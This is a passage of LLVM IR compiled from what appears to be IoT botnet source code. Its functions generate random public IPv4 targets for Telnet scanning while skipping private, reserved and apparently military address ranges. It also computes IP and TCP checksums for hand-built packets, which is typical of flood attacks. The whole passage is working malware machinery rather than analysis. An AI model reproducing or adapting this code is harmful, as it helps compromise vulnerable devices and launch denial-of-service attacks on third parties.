  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %132, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %130, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %130, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp sge i32 %28, 64
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp sle i32 %32, 127
  br i1 %33, label %130, label %34

; <label>:34:                                     ; preds = %30, %26, %22
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 127
  br i1 %37, label %130, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 169
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 254
  br i1 %45, label %130, label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 172
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp sle i32 %52, 16
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sle i32 %56, 31
  br i1 %57, label %130, label %58

; <label>:58:                                     ; preds = %54, %50, %46
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 192
  br i1 %61, label %62, label %70

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %70

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 2
  br i1 %69, label %130, label %70

; <label>:70:                                     ; preds = %66, %62, %58
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 192
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 88
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 99
  br i1 %81, label %130, label %82

; <label>:82:                                     ; preds = %78, %74, %70
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 192
  br i1 %85, label %86, label %90

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 168
  br i1 %89, label %130, label %90

; <label>:90:                                     ; preds = %86, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 198
  br i1 %93, label %94, label %102

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 18
  br i1 %97, label %130, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 19
  br i1 %101, label %130, label %102

; <label>:102:                                    ; preds = %98, %90
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 198
  br i1 %105, label %106, label %114

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 51
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 100
  br i1 %113, label %130, label %114

; <label>:114:                                    ; preds = %110, %106, %102
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 203
  br i1 %117, label %118, label %126

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %126

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 113
  br i1 %125, label %130, label %126

; <label>:126:                                    ; preds = %122, %118, %114
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sge i32 %128, 224
  br label %130

; <label>:130:                                    ; preds = %126, %122, %110, %98, %94, %86, %78, %66, %54, %42, %34, %30, %18, %14
  %131 = phi i1 [ true, %122 ], [ true, %110 ], [ true, %98 ], [ true, %94 ], [ true, %86 ], [ true, %78 ], [ true, %66 ], [ true, %54 ], [ true, %42 ], [ true, %34 ], [ true, %30 ], [ true, %18 ], [ true, %14 ], [ %129, %126 ]
  br i1 %131, label %132, label %145

; <label>:132:                                    ; preds = %130
  %133 = call i32 @rand() #5
  %134 = srem i32 %133, 223
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = call i32 @rand() #5
  %137 = srem i32 %136, 255
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %139 = call i32 @rand() #5
  %140 = srem i32 %139, 255
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %142 = call i32 @rand() #5
  %143 = srem i32 %142, 255
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:145:                                    ; preds = %130
  %146 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %146, i8 0, i64 16, i32 16, i1 false)
  %147 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %148 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %149 = zext i8 %148 to i32
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %153 = zext i8 %152 to i32
  %154 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %155 = zext i8 %154 to i32
  %156 = call i32 (i8*, i8*, ...) @szprintf(i8* %147, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %149, i32 %151, i32 %153, i32 %155)
  %157 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %158 = call i32 @inet_addr(i8* %157) #5
  ret i32 %158
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @TelnetIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

; <label>:62:                                     ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

; <label>:74:                                     ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

; <label>:82:                                     ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

; <label>:150:                                    ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

; <label>:152:                                    ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

; <label>:154:                                    ; preds = %152
  %155 = call i32 @rand() #5
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #5
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #5
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #5
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:167:                                    ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %171, i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #5
  ret i32 %180
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
